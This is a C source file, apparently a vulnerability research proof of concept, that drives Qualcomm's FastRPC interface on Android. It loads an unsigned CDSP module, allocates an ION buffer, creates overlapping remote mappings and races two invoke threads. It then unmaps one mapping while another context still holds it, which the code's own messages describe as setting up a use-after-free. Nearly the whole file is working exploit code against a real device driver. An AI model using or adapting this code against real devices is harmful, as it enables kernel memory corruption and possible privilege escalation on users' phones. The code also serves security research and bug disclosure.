#define _GNU_SOURCE

#include "t870_fastrpc_session.h"

#include <android/dlext.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define ION_IOC_MAGIC 'I'
#define ION_SYSTEM_HEAP_ID 25U
#define ION_FLAG_CACHED 1U
#define CDSP_DOMAIN_ID 3
#define DSPRPC_CONTROL_UNSIGNED_MODULE 2U
#define SMALL_MAP_SIZE 0x10000U
#define BIG_MAP_SIZE 0x10100U
#define BUFFER_SUBRANGE_VA 0x10000U
#define BUFFER_SUBRANGE_SIZE 0x100U
#define LOW_VMA_SIZE 0x1000U
#ifndef MAP_FIXED_NOREPLACE
#define MAP_FIXED_NOREPLACE 0x100000
#endif
#define STATUS_CONTEXT1_ENTERED 1U
#define SC_STATUS 0x05000100U
#define SC_CANCEL_CONTEXT1 0x06000000U
#define SC_RELEASE_CONTEXT2 0x07000000U
#define SC_HOLD_HANDLE 0x08000010U
#define SC_HOLD_BUFFER 0x09010000U
#define SC_RESET 0x0a000000U

struct ion_allocation_data {
    size_t len;
    unsigned int heap_id_mask;
    unsigned int flags;
    uint32_t fd;
    uint32_t unused;
};

#define ION_IOC_ALLOC \
    _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)

typedef uint64_t remote_handle64;

struct remote_buf {
    void *pv;
    size_t nLen;
};

struct remote_dma_handle {
    int32_t fd;
    uint32_t offset;
};

union remote_arg {
    struct remote_buf buf;
    struct remote_dma_handle dma;
    remote_handle64 h64;
};

struct unsigned_module_control {
    int domain;
    int enable;
};

typedef int (*session_control_fn)(uint32_t, void *, uint32_t);
typedef int (*handle_open_fn)(const char *, remote_handle64 *);
typedef int (*handle_close_fn)(remote_handle64);
typedef int (*handle_invoke_fn)(remote_handle64, uint32_t,
                                union remote_arg *);
typedef int (*register_dma_handle_fn)(int, uint32_t);
typedef void (*register_buf_fn)(void *, int, int);
typedef int (*remote_mmap64_fn)(int, uint32_t, uint64_t, int64_t,
                                uint64_t *);
typedef int (*remote_munmap64_fn)(uint64_t, int64_t);

struct invoke_job {
    handle_invoke_fn invoke;
    remote_handle64 handle;
    uint32_t scalar;
    union remote_arg argument;
    int result;
    int invoke_errno;
    volatile int done;
};

struct t870_fastrpc_session {
    void *library;
    session_control_fn session_control;
    handle_open_fn handle_open;
    handle_close_fn handle_close;
    handle_invoke_fn handle_invoke;
    register_dma_handle_fn register_dma_handle;
    register_buf_fn register_buf;
    remote_mmap64_fn remote_mmap64;
    remote_munmap64_fn remote_munmap64;
    remote_handle64 handle;
    uint64_t map_a;
    uint64_t map_b;
    int target_fd;
    void *low_vma;
    struct invoke_job context1;
    struct invoke_job context2;
    pthread_t context1_thread;
    pthread_t context2_thread;
    int context1_started;
    int context2_started;
    int dirty;
};

static void *required_symbol(void *library, const char *name)
{
    const char *error;
    void *symbol;

    dlerror();
    symbol = dlsym(library, name);
    error = dlerror();
    if (error != NULL)
        fprintf(stderr, "[-] dlsym(%s): %s\n", name, error);
    return error == NULL ? symbol : NULL;
}

typedef struct android_namespace_t *
    (*get_exported_namespace_fn)(const char *name);

static void *open_fastrpc_library(const char *library_path)
{
    char default_error[256] = {0};
    void *namespace_api;
    get_exported_namespace_fn get_exported_namespace;
    struct android_namespace_t *sphal_namespace;
    android_dlextinfo extension = {0};
    void *library;
    const char *error;

    library = dlopen(library_path, RTLD_NOW | RTLD_LOCAL);
    if (library != NULL)
        return library;
    error = dlerror();
    if (error != NULL)
        (void)snprintf(default_error, sizeof(default_error), "%s", error);

    namespace_api = dlopen("libdl_android.so", RTLD_NOW | RTLD_LOCAL);
    if (namespace_api == NULL) {
        fprintf(stderr, "[-] default dlopen: %s\n",
                default_error[0] != '\0' ? default_error : "unknown error");
        fprintf(stderr, "[-] libdl_android dlopen: %s\n", dlerror());
        return NULL;
    }
    get_exported_namespace = (get_exported_namespace_fn)
        required_symbol(namespace_api, "android_get_exported_namespace");
    if (get_exported_namespace == NULL) {
        dlclose(namespace_api);
        return NULL;
    }
    sphal_namespace = get_exported_namespace("sphal");
    if (sphal_namespace == NULL) {
        fputs("[-] exported sphal namespace unavailable\n", stderr);
        dlclose(namespace_api);
        return NULL;
    }
    extension.flags = ANDROID_DLEXT_USE_NAMESPACE;
    extension.library_namespace = sphal_namespace;
    library = android_dlopen_ext(library_path, RTLD_NOW | RTLD_LOCAL,
                                 &extension);
    if (library == NULL) {
        fprintf(stderr, "[-] default dlopen: %s\n",
                default_error[0] != '\0' ? default_error : "unknown error");
        fprintf(stderr, "[-] sphal android_dlopen_ext: %s\n", dlerror());
    } else {
        printf("[+] FastRPC library loaded through sphal namespace\n");
    }
    dlclose(namespace_api);
    return library;
}

static int allocate_ion_buffer(size_t size)
{
    struct ion_allocation_data allocation = {
        .len = size,
        .heap_id_mask = 1U << ION_SYSTEM_HEAP_ID,
        .flags = ION_FLAG_CACHED,
    };
    int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);

    if (ion_fd < 0) {
        fprintf(stderr, "[-] open /dev/ion: %s\n", strerror(errno));
        return -1;
    }
    if (ioctl(ion_fd, ION_IOC_ALLOC, &allocation) != 0) {
        fprintf(stderr, "[-] ION_IOC_ALLOC: %s\n", strerror(errno));
        close(ion_fd);
        return -1;
    }
    close(ion_fd);
    printf("[+] ION target fd=%u len=%zu\n", allocation.fd,
           allocation.len);
    return (int)allocation.fd;
}

static void *invoke_thread(void *opaque)
{
    struct invoke_job *job = opaque;

    errno = 0;
    job->result = job->invoke(job->handle, job->scalar, &job->argument);
    job->invoke_errno = errno;
    __sync_synchronize();
    job->done = 1;
    return NULL;
}

static int wait_for_context1_return(struct invoke_job *context1,
                                    struct invoke_job *context2)
{
    unsigned int attempt;

    for (attempt = 0; attempt < 500U; ++attempt) {
        __sync_synchronize();
        if (context1->done)
            return 0;
        if (context2->done) {
            fprintf(stderr, "[-] context2 returned before context1 ret=%d "
                    "errno=%d (%s)\n", context2->result,
                    context2->invoke_errno,
                    strerror(context2->invoke_errno));
            return -1;
        }
        usleep(10000);
    }
    fputs("[-] context1 did not return within 5 seconds\n", stderr);
    return -1;
}

static int wait_for_context1(handle_invoke_fn invoke,
                             remote_handle64 handle)
{
    unsigned int attempt;

    for (attempt = 0; attempt < 100U; ++attempt) {
        uint32_t status = 0;
        union remote_arg argument = {0};
        int result;

        argument.buf.pv = &status;
        argument.buf.nLen = sizeof(status);
        result = invoke(handle, SC_STATUS, &argument);
        if (result != 0) {
            fprintf(stderr, "[-] status invoke ret=%d\n", result);
            return -1;
        }
        if (status & STATUS_CONTEXT1_ENTERED) {
            printf("[+] context1 entered on DSP status=0x%x\n", status);
            return 0;
        }
        usleep(20000);
    }
    fputs("[-] context1 did not enter within 2 seconds\n", stderr);
    return -1;
}

static void cancel_clean_contexts(struct t870_fastrpc_session *session)
{
    if (session->context1_started) {
        (void)session->handle_invoke(session->handle,
                                     SC_CANCEL_CONTEXT1, NULL);
        (void)pthread_join(session->context1_thread, NULL);
        session->context1_started = 0;
    }
    if (session->context2_started) {
        (void)session->handle_invoke(session->handle,
                                     SC_RELEASE_CONTEXT2, NULL);
        (void)pthread_join(session->context2_thread, NULL);
        session->context2_started = 0;
    }
}

struct t870_fastrpc_session *
t870_fastrpc_session_open(const char *dsp_library_directory)
{
    static const char module_uri[] =
        "file:///libt870_map_collision_skel.so?"
        "t870_map_collision_skel_handle_invoke"
        "&_modver=1.0&_dom=cdsp";
    struct unsigned_module_control control = { CDSP_DOMAIN_ID, 1 };
    struct t870_fastrpc_session *session;
    const char *library_path;

    if (dsp_library_directory == NULL ||
        dsp_library_directory[0] == '\0') {
        errno = EINVAL;
        return NULL;
    }
    session = calloc(1, sizeof(*session));
    if (session == NULL)
        return NULL;
    session->target_fd = -1;
    session->low_vma = MAP_FAILED;

    library_path = getenv("FASTRPC_LIBRARY");
    if (library_path == NULL || library_path[0] == '\0')
        library_path = "/vendor/lib64/libcdsprpc.so";
    if (setenv("ADSP_LIBRARY_PATH", dsp_library_directory, 1) != 0) {
        fprintf(stderr, "[-] setenv: %s\n", strerror(errno));
        goto fail;
    }
    printf("[*] uid=%d library=%s\n", getuid(), library_path);
    session->library = open_fastrpc_library(library_path);
    if (session->library == NULL)
        goto fail;
    session->session_control = (session_control_fn)
        required_symbol(session->library, "remote_session_control");
    session->handle_open = (handle_open_fn)
        required_symbol(session->library, "remote_handle64_open");
    session->handle_close = (handle_close_fn)
        required_symbol(session->library, "remote_handle64_close");
    session->handle_invoke = (handle_invoke_fn)
        required_symbol(session->library, "remote_handle64_invoke");
    session->register_dma_handle = (register_dma_handle_fn)
        required_symbol(session->library, "remote_register_dma_handle");
    session->register_buf = (register_buf_fn)
        required_symbol(session->library, "remote_register_buf");
    session->remote_mmap64 = (remote_mmap64_fn)
        required_symbol(session->library, "remote_mmap64");
    session->remote_munmap64 = (remote_munmap64_fn)
        required_symbol(session->library, "remote_munmap64");
    if (session->session_control == NULL || session->handle_open == NULL ||
        session->handle_close == NULL || session->handle_invoke == NULL ||
        session->register_dma_handle == NULL ||
        session->register_buf == NULL || session->remote_mmap64 == NULL ||
        session->remote_munmap64 == NULL)
        goto fail;
    if (session->session_control(DSPRPC_CONTROL_UNSIGNED_MODULE, &control,
                                 sizeof(control)) != 0) {
        fputs("[-] unsigned CDSP session control failed\n", stderr);
        goto fail;
    }
    if (session->handle_open(module_uri, &session->handle) != 0) {
        fputs("[-] collision object open failed\n", stderr);
        goto fail;
    }
    printf("[+] collision handle=0x%016" PRIx64 "\n", session->handle);
    if (session->handle_invoke(session->handle, SC_RESET, NULL) != 0) {
        fputs("[-] DSP state reset failed\n", stderr);
        goto fail;
    }
    return session;

fail:
    (void)t870_fastrpc_session_close(session);
    return NULL;
}

int t870_fastrpc_session_arm_collision(struct t870_fastrpc_session *session)
{
    int thread_error;

    if (session == NULL || session->handle == 0 || session->dirty ||
        session->context1_started || session->context2_started) {
        errno = EINVAL;
        return -1;
    }
    session->target_fd = allocate_ion_buffer(BIG_MAP_SIZE);
    if (session->target_fd < 0)
        return -1;
    session->low_vma = mmap((void *)(uintptr_t)BUFFER_SUBRANGE_VA,
                            LOW_VMA_SIZE, PROT_READ | PROT_WRITE,
                            MAP_SHARED | MAP_FIXED_NOREPLACE,
                            session->target_fd, 0);
    if (session->low_vma == MAP_FAILED) {
        fprintf(stderr, "[-] exact low VMA mmap at 0x%x failed: %s\n",
                BUFFER_SUBRANGE_VA, strerror(errno));
        return -1;
    }
    if (session->low_vma != (void *)(uintptr_t)BUFFER_SUBRANGE_VA) {
        fprintf(stderr, "[-] exact low VMA landed at %p; refusing trigger\n",
                session->low_vma);
        (void)munmap(session->low_vma, LOW_VMA_SIZE);
        session->low_vma = MAP_FAILED;
        return -1;
    }
    printf("[+] exact low VMA=[0x%x,0x%x) backed by target fd\n",
           BUFFER_SUBRANGE_VA, BUFFER_SUBRANGE_VA + LOW_VMA_SIZE);
    if (session->remote_mmap64(session->target_fd, 0, 0, SMALL_MAP_SIZE,
                               &session->map_a) != 0) {
        fputs("[-] PZ step 1: map A failed\n", stderr);
        return -1;
    }
    printf("[+] PZ step 1: map A va=0 len=0x%x raddr=0x%016" PRIx64
           "\n", SMALL_MAP_SIZE, session->map_a);
    if (session->register_dma_handle(session->target_fd, BIG_MAP_SIZE) != 0) {
        fputs("[-] DMA handle registration failed\n", stderr);
        return -1;
    }

    session->context1.invoke = session->handle_invoke;
    session->context1.handle = session->handle;
    session->context1.scalar = SC_HOLD_HANDLE;
    session->context1.argument.dma.fd = session->target_fd;
    session->context1.argument.dma.offset = 0;
    thread_error = pthread_create(&session->context1_thread, NULL,
                                  invoke_thread, &session->context1);
    if (thread_error != 0) {
        fprintf(stderr, "[-] PZ step 2: context1 thread creation failed: "
                "%s\n", strerror(thread_error));
        return -1;
    }
    session->context1_started = 1;
    if (wait_for_context1(session->handle_invoke, session->handle) != 0)
        goto clean_fail;
    puts("[+] PZ step 2: context1 holds map A as a handle");

    if (session->remote_mmap64(session->target_fd, 0, 0, BIG_MAP_SIZE,
                               &session->map_b) != 0) {
        fputs("[-] PZ step 3: map B failed\n", stderr);
        goto clean_fail;
    }
    printf("[+] PZ step 3: map B va=0 len=0x%x raddr=0x%016" PRIx64
           "\n", BIG_MAP_SIZE, session->map_b);

    session->register_buf((void *)(uintptr_t)BUFFER_SUBRANGE_VA,
                          BUFFER_SUBRANGE_SIZE, session->target_fd);
    session->context2.invoke = session->handle_invoke;
    session->context2.handle = session->handle;
    session->context2.scalar = SC_HOLD_BUFFER;
    session->context2.argument.buf.pv =
        (void *)(uintptr_t)BUFFER_SUBRANGE_VA;
    session->context2.argument.buf.nLen = BUFFER_SUBRANGE_SIZE;
    thread_error = pthread_create(&session->context2_thread, NULL,
                                  invoke_thread, &session->context2);
    if (thread_error != 0) {
        fprintf(stderr, "[-] PZ step 4: context2 thread creation failed: "
                "%s\n", strerror(thread_error));
        goto clean_fail;
    }
    session->context2_started = 1;
    printf("[*] PZ step 4: context2 submitted B-only subrange "
           "[0x%x,0x%x) as a buffer\n", BUFFER_SUBRANGE_VA,
           BUFFER_SUBRANGE_VA + BUFFER_SUBRANGE_SIZE);

    if (wait_for_context1_return(&session->context1,
                                 &session->context2) != 0) {
        uint32_t diagnostic_status = 0;
        union remote_arg diagnostic_argument = {0};
        int diagnostic_result;

        diagnostic_argument.buf.pv = &diagnostic_status;
        diagnostic_argument.buf.nLen = sizeof(diagnostic_status);
        diagnostic_result = session->handle_invoke(
            session->handle, SC_STATUS, &diagnostic_argument);
        printf("[*] failure checkpoint DSP status ret=%d state=0x%x\n",
               diagnostic_result, diagnostic_status);
        goto clean_fail;
    }
    (void)pthread_join(session->context1_thread, NULL);
    session->context1_started = 0;
    printf("[*] PZ step 5: context1 returned ret=%d\n",
           session->context1.result);
    if (session->context1.result != 0) {
        fputs("[-] context1 failed; refusing B unmap\n", stderr);
        goto clean_fail;
    }

    if (session->remote_munmap64(session->map_b, BIG_MAP_SIZE) != 0) {
        fputs("[-] PZ step 6: map B unmap failed; refusing UAF "
              "dereference\n", stderr);
        goto clean_fail;
    }
    session->dirty = 1;
    puts("[+] PZ step 6: map B unmapped while context2 remains retained");
    return 0;

clean_fail:
    cancel_clean_contexts(session);
    return -1;
}

int t870_fastrpc_session_release_stale_map(
    struct t870_fastrpc_session *session, int *context2_result)
{
    int control_result;
    int join_result;

    if (session == NULL || !session->dirty ||
        !session->context2_started) {
        errno = EINVAL;
        return -1;
    }
    control_result = session->handle_invoke(session->handle,
                                            SC_RELEASE_CONTEXT2, NULL);
    if (control_result != 0) {
        fprintf(stderr, "[-] DSP release-context2 control failed ret=%d\n",
                control_result);
        return -1;
    }
    join_result = pthread_join(session->context2_thread, NULL);
    if (join_result != 0) {
        fprintf(stderr, "[-] context2 join failed: %s\n",
                strerror(join_result));
        return -1;
    }
    session->context2_started = 0;
    if (context2_result != NULL)
        *context2_result = session->context2.result;
    printf("[+] context2 returned ret=%d after stale-map release\n",
           session->context2.result);
    return 0;
}

int t870_fastrpc_session_is_dirty(
    const struct t870_fastrpc_session *session)
{
    return session != NULL && session->dirty;
}

int t870_fastrpc_session_close(struct t870_fastrpc_session *session)
{
    if (session == NULL)
        return 0;
    if (session->dirty && session->context2_started) {
        errno = EBUSY;
        return -1;
    }
    cancel_clean_contexts(session);
    if (session->target_fd >= 0)
        close(session->target_fd);
    if (session->low_vma != MAP_FAILED)
        (void)munmap(session->low_vma, LOW_VMA_SIZE);
    if (session->handle != 0 && session->handle_close != NULL) {
        int close_result = session->handle_close(session->handle);

        printf("[*] collision handle close ret=%d\n", close_result);
    }
    if (session->library != NULL)
        dlclose(session->library);
    free(session);
    return 0;
}
